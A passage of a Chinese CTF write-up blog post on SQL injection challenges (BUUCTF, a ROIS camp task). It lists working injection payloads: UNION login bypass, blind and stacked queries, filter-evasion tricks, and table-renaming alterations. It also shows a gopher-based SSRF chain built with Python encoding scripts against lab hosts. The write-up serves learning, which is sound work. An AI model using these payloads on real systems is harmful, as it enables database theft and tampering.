ada">username:*&#x27; UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;123&quot;</span><span class="hljs-comment">--+</span><br>password:<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>用户名中的”*”指的是一个数据库中不存在的用户名，空着也行，然后单引号闭合。SELECT “admin” 和 “123”，最后”–+”闭合语句，这样一来整个sql语句的查询结果就变成了</p><table><thead><tr><th>username</th><th>password</th></tr></thead><tbody><tr><td>admin</td><td>123</td></tr></tbody></table><p>那么当用户输入密码为”123”自然就等于row.password了，登陆成功。</p><p>为便于理解，我们本地创建一个表<code>user_info</code>，表如下：</p><p><img src="/2023/02/09/SQLI/image-20230412122726143.png"></p><p>本地测试结果如下：</p><p><img src="/2023/02/09/SQLI/image-20230412123052991.png"></p><p>表中不存在”21112”的用户，因此此处无查询结果，联合查询利用select直接返回字符串。如果username填入已有用户，查询结果如下：</p><p><img src="/2023/02/09/SQLI/image-20230412123949128.png"></p><p>当然，要学会善于利用工具（，话不多说，上图</p><p><img src="/2023/02/09/SQLI/B041239C46DBC25E5C1727ACF80014FC.jpg"></p><p>这道题用sqlmap也能直接淦出来。厚礼蟹</p><hr><h2 id="BUUCTF-EasySql"><a href="#BUUCTF-EasySql" class="headerlink" title="BUUCTF-EasySql"></a>BUUCTF-EasySql</h2><p>先用用户名:<em><strong>1</strong></em>  密码:<em><strong>1’</strong></em>  测试注入，页面报错，可能存在注入点，并且是字符型。</p><p><img src="/2023/02/09/SQLI/image-20230213012236141.png"></p><p>密码传入***1’ order by 4 #***时报错，判断出数据库有三个字段。</p><p><img src="/2023/02/09/SQLI/image-20230213013114976.png"></p><p>准备爆数据库名，二分法传入***1’ or (ascii(substr(database(),0,1))&lt;128)#***，结果直接拿到了flag。</p><p><img src="/2023/02/09/SQLI/image-20230213013848916.png"></p><p>题后反思：因为传入***1’ or (ascii(substr(database(),0,1))&lt;128)#*<strong>导致后端查询语句变成</strong>select * from 数据库名 where username &#x3D; ‘1’ and pasword &#x3D;’1’  or (ascii(substr(database(),0,1))&lt;128)#’***因为and优先级高于or，于是整个句子变成了两个部分：</p><p><em><strong>select * from 数据库名 where username &#x3D; ‘1’ and pasword &#x3D;’1’</strong></em> 和</p><p><em><strong>or (ascii(substr(database(),0,1))&lt;128)#’</strong></em></p><p>虽然用户名密码判断是错的，但是数据库名的第一个字符的ascii码确实小于128，为真，二者用or相连，返回为true，故登陆成功获取到flag；</p><p>但是这样做实际上是走弯路了，这道题布尔盲注不是最优解，实际上直接构造密码为***1’ or 1&#x3D;1#***在原理上是和上面误打误撞拿到flag是一样的，但是少走了很多弯路。</p><hr><h2 id="BUUCTF-easy-sql"><a href="#BUUCTF-easy-sql" class="headerlink" title="BUUCTF-easy_sql"></a>BUUCTF-easy_sql</h2><p>先传入1，返回一个字符串，传入1’，报错</p><p><img src="/2023/02/09/SQLI/image-20230213133221152.png"></p><p>可能存在sql注入，并且是字符型的。传入***’ order by 4#***，报错。<img src="/2023/02/09/SQLI/image-20230213140043405.png"></p><p>传入***’ order by 3#<em><strong>，报错。传入</strong></em>‘ order by 2#***不报错，判断表里有2个字段。</p><p><img src="/2023/02/09/SQLI/image-20230213140715876.png"></p><p>联合查询尝试失败，select被ban。尝试构造无字母数字的语句。编写脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;s&#x27;</span>;<span class="hljs-comment">//依次将s改为e,l,e,c,t</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>^<span class="hljs-variable">$j</span>)==<span class="hljs-variable">$var</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>)).<span class="hljs-string">&quot;^&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$j</span>)));<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125; <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>得到select，尝试能否绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-string">&#x27;%5D&#x27;</span>^<span class="hljs-string">&#x27;.&#x27;</span>).(<span class="hljs-string">&#x27;H&#x27;</span>^<span class="hljs-string">&#x27;-&#x27;</span>).(<span class="hljs-string">&#x27;%5D&#x27;</span>^<span class="hljs-string">&#x27;1&#x27;</span>).(<span class="hljs-string">&#x27;H&#x27;</span>^<span class="hljs-string">&#x27;-&#x27;</span>).(<span class="hljs-string">&#x27;_&#x27;</span>^<span class="hljs-string">&#x27;%3C&#x27;</span>).(<span class="hljs-string">&#x27;_&#x27;</span>^<span class="hljs-string">&#x27;%2B&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还是没绕过，暂时放弃这条路。</p><p><img src="/2023/02/09/SQLI/image-20230213143545653.png"></p><p>查找学习show databases爆数据库名。<img src="/2023/02/09/SQLI/image-20230213144232143.png"></p><p>show tables爆表名，好臭的表名啊(。</p><p><img src="/2023/02/09/SQLI/image-20230213144433988.png"></p><p>‘; show columns from <code>1919810931114514</code>;#爆字段名（表名要用反引号引起来，typora里不知道为什么吞反引号）</p><p><img src="/2023/02/09/SQLI/image-20230213144916052.png"></p><p>万事俱备，只欠select，直接select不行，去查找能代替select的，果不其然，找到了handler语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler [表名] open;#打开表（句柄）<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler [表名] read first;#从表的第一列开始读（指针的起点）<br>handler [表名] read next;#指针往后一位，读取数据（参考资料https://blog.csdn.net/JesseYoung/article/details/40785137）<br></code></pre></td></tr></table></figure><p>最终构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first;#<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213152804918.png"></p><p>拿到flag。</p><p>反思：除了上面的方法寻找mysql中的其他查询语句外，看了大佬们的wp后学到了更多的思路和相关知识，这道题还可以通过预编译得到flag。</p><p>预编译相关语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set : #设置变量；<br>prepare : #准备一个语句赋予其名称，之后直接调用语句；<br>execute :#执行语句；<br></code></pre></td></tr></table></figure><p>以及一个mysql语句concat(str1,str2)，将str1与str2连接起来返回连接后的字符串；或者mysql的hex()函数把语句变成十六进制同样可以绕过select的过滤。</p><p>步骤如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);#创建一个变量@abc为字符串&quot;select * from `1919810931114514`&quot;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare sel from @abc;#预备一个语句sel，内容是@abc，也就是&quot;select * from `1919810931114514`&quot;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">execute sel;#执行sel语句；<br></code></pre></td></tr></table></figure><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213160841525.png"></p><p>然后提示set被ban了，但是用的是strstr()，区分大小写，所以大写绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;Set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213161126295.png"></p><p>十六进制绕过的步骤如下：</p><p>打开mysql命令行输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select hex(&quot;select * from `191981096114514`&quot;);<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213162154710.png"></p><p>得到一串十六进制字符串。</p><p>构造预处理语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @abc=73656C656374202A2066726F6D206031393139383130393631313435313460;prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p>set同样大写绕过，payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;Set @abc=0x<span class="hljs-number">7365</span>6C<span class="hljs-number">65637420</span>2A<span class="hljs-number">206672</span>6F6D<span class="hljs-number">20603139313938</span><span class="hljs-number">31303933313131</span><span class="hljs-number">3435313460</span>;Prepare sel from @abc;execute sel;#<br>(上面的图里应该是<span class="hljs-number">19198109311451</span>4打错了，最终结果应该是上面这行代码//到底是谁起的这个名字啊啊啊啊啊)<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213163140720.png"></p><p>GET到flag；</p><p>另外一种思路，从最开始看到题目的时候就在想直接输入1回显的数组是来自哪里的呢，但是最开始做的时候爆了191981093114514表就没爆words表的字段名了，因为191981093114514表里只有一个元素，所以推测回显内容是words表里的，爆words字段名</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&#x27;;show columns <span class="hljs-keyword">from</span> `<span class="hljs-built_in">words</span>`;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213164015355.png"></p><p>推测回显内容来自于data字段；</p><p>思路就是把words表改名为其他的名字，191981093114514改名为words，把其中的flag字段改名为id（或者在xinwords表里增加一列id），最后传入***1’ or 1&#x3D;1#***使查询结果为true爆出words所有字段内容。</p><p>相关语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter table [表名] add [字段名] int(***)/varchar(***) #增加列<br>alter table [表名] drop [字段名]#删除列<br>alter table [表名] change [字段名] [新字段名] int(***)/varchar(***)#重命名字段<br>alter table [表名] rename to [新表名]#重命名表,to可省略<br>rename table [表名] to [新表名]#重命名表<br></code></pre></td></tr></table></figure><p>payload1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;;rename table words to word;rename table `1919810931114514` to words;alter table words add id int(3);##新增一列id<br></code></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;;rename table words to word;rename table `1919810931114514` to words;alter table words change flag id varchar(50);#<br>#修改flag字段名为id<br></code></pre></td></tr></table></figure><hr><h2 id="2023ROIS冬令营internal"><a href="#2023ROIS冬令营internal" class="headerlink" title="2023ROIS冬令营internal"></a>2023ROIS冬令营internal</h2><p>这是什么，两个超链接，点一下（</p><p><img src="/2023/02/09/SQLI/image-20230410150245999.png"></p><p>​SQLI页面中的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try to access it from internal!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome!\n&quot;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(DB_HOST, DB_USER, DB_PASS, DB_DATABASE);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM messages WHERE id=<span class="hljs-subst">$id</span>&quot;</span>; <span class="hljs-comment">// SQLI &gt;_&lt;</span><br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>)[<span class="hljs-string">&#x27;message&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$message</span>;<br><span class="hljs-comment">#回显Try to access it from internal!</span><br></code></pre></td></tr></table></figure><p><code>if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== &#39;127.0.0.1&#39;)</code>用户访问的IP必须是本地IP才能进行下面的数据库操作等步骤，也就是说只有通过网页服务器内网访问。如果我们能够通过这个服务器中的另外一个不限制于内网访问的页面，把它当做跳板间接对这个仅内网访问的页面进行操作，就能进行传参等操作。也就是实现SSRF。先看另外一个页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Hint: Do you know gopher?</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file:|ftp:|http:|scp:|dict:/i&quot;</span>,<span class="hljs-variable">$url</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br></code></pre></td></tr></table></figure><p><code>curl_init()</code>函数初始化一个curl绘会话，值传给<code>$ch</code>，<code>curl_exec()</code>函数执行一个curl会话，值传给<code>$res</code>。最后将结果打印出来。既然可以执行curl，那么不就意味着可以通过这个页面对SQLI页面进行传参等操作了吗。给出了提示：<code>&quot;Do you know gopher?&quot;</code>。emmm。。。并不知道。那就学呗。找到了一篇<a href="https://zhuanlan.zhihu.com/p/112055947">讲的比较详细的文章</a>学习了一下。</p><p>gopher是啥？它是一种协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。</p><p>gopher协议的格式：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/_</span>后接<span class="hljs-title class_">TCP</span>数据流<br></code></pre></td></tr></table></figure><p>需要注意的是，TCP数据流必须是经过url编码的，并且回车和换行必须是<code>%0D%0A</code>，使用脚本或工具编码后回车换行会变成<code>%0A</code>，因此要多一步replace的步骤。在HTTP包的最后要加<code>%0D%0A</code>，代表消息结束（具体可研究HTTP包结束）。以下是通过gopher协议传参的一次示例：</p><p>GET请求：</p><p>准备好一个监听机和一个用户机：</p><p><img src="/2023/02/09/SQLI/image-20230410153558433.png"></p><p><code>nc -lp 1234</code>监听1234端口，使用curl发送http请求<code>curl gopher://172.17.0.1:1234/abcd</code>，监听机收到消息为”bcd”；发送请求<code>curl gopher://172.17.0.1:1234/aabcd</code>nc监听到abcd。因此紧跟在<code>&quot;&lt;PORT&gt;/&quot;</code>字符后面的一个字符会被忽略，可换为任意一个字符。</p><p><img src="/2023/02/09/SQLI/image-20230410182351129.png"></p><p>这是一段网页源码，作用是将GET传入的name的值打印出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个GET请求包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/ssrf.php?name=Potatowo</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.17.0.1<br>#回车<br></code></pre></td></tr></table></figure><p>经Python脚本编写，生成对应的请求包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;GET /ssrf.php?name=Margin HTTP/1.1</span><br><span class="hljs-string">Host: 172.17.0.1</span><br><span class="hljs-string">#该行要有回车，HTTP数据包结尾</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<span class="hljs-comment">#此处将&quot;%0A&quot;替换成&quot;%0D%0A&quot;</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A</span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>POST请求：</p><p>这是一段网页源码，功能不做过多赘述：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个POST请求包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ssrf/base/post.php</span> <span class="hljs-meta">HTTP/1.1</span><br>host:172.17.0.1<br>Content-Type:application/x-www-form-urlencoded<br>Content-Length:11<br><br><span class="language-ini"><span class="hljs-attr">name</span>=Potatowo</span><br><span class="language-ini"><span class="hljs-comment">#回车</span></span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_POST%20/ssrf/base/post.php%20HTTP/1.1%0D%0Ahost%3A172.17.0.1%0D%0AContent-Type%3Aapplication/x-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0Aname%3DPotatowo%0D%0A%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>现在回到本题；</p><p>既然用得到请求包，那就先bp抓包，对SQLI页面传参，那就抓SQLI页面的包：</p><p><img src="/2023/02/09/SQLI/image-20230410194114453.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1#使用脚本时删掉该注释，此处要把原包ip改为改为127.0.0.1</span><br><span class="hljs-string">Content-Length: 4</span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = result = urllib.parse.quote(result)<br><span class="hljs-comment">#要注意！！如果是希望在浏览器里传参，则要编码两次！！浏览器会自动解码一次，后端解码一次；但是像下面</span><br><span class="hljs-comment">#要讲的用python的requests库直接传参就只需要编码一次因为不需要经过浏览器解码</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%25204%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/109.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250Aid%253D1%250D%250A%250D%250A</span><br><br></code></pre></td></tr></table></figure><p>改为符合gopher协议的形式，注意由于<code>curl_exec()</code>的执行是在服务端里进行的，所以<code>gopher://</code>协议的地址应改为<code>127.0.0.1:80</code>，80端口是跑web服务的端口。</p><p><img src="/2023/02/09/SQLI/image-20230410201414804.png"></p><p>将脚本中的content进行修改，<code>content = &quot;id=1 and 1=1&quot;</code>，传入，结果：</p><p><img src="/2023/02/09/SQLI/image-20230411013245234.png"></p><p>emmm。。这时候突然想起来SQLI页面是不是有过滤来着赶紧打开看了眼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>看来是ban掉了union和空格。难怪，那改成<code>content = &quot;id=1/**/and/**/1=1&quot;</code>绕过空格过滤，回显<code>&quot;Welcome! meow meow meow~1&quot;</code>，改成<code>content = &quot;id=1/**/and/**/1=2&quot;</code>，回显<code>&quot;Welcome! 1&quot;</code>。sql语句判断为真会返回<code>&quot;Welcome! meow meow meow~1&quot;</code>，为假不含<code>meow meow meow~</code>，同时union被ban了，尝试用加号拼接<code>&quot;uni&quot;</code>,<code>&quot;on&quot;</code>，结果加号url编码与空格相同（悲，现在意图也比较明显了，布尔盲注。</p><p>完善脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span 